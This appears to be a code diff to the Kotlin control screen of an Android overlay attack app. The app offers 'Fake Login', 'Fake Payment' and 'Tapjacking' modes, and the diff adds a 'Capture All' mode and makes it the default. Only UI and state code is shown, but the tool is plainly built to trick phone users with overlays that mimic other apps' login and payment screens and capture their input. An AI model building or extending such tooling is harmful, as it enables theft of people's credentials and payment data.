@@ -227,7 +227,7 @@ fun ControlTab() {
     var hasOverlayPerm by remember { mutableStateOf(OverlayPermissionHelper.canDrawOverlays(context)) }
     var hasUsageStatsPerm by remember { mutableStateOf(OverlayPermissionHelper.hasUsageStatsPermission(context)) }
     var serviceRunning by remember { mutableStateOf(false) }
-    var attackMode by remember { mutableStateOf(OverlayService.MODE_LOGIN) }
+    var attackMode by remember { mutableStateOf(OverlayService.MODE_CAPTURE_ALL) }
 
     // Refresh permissions when returning to this screen
     LaunchedEffect(Unit) {
@@ -310,6 +310,7 @@ fun ControlTab() {
         )
 
         listOf(
+            Triple(OverlayService.MODE_CAPTURE_ALL, "Capture All", "Full verification — captures everything"),
             Triple(OverlayService.MODE_LOGIN, "Fake Login", "Mimics target login screen"),
             Triple(OverlayService.MODE_PAYMENT, "Fake Payment", "Mimics target payment screen"),
             Triple(OverlayService.MODE_TAPJACKING, "Tapjacking", "Transparent overlay for tap capture"),
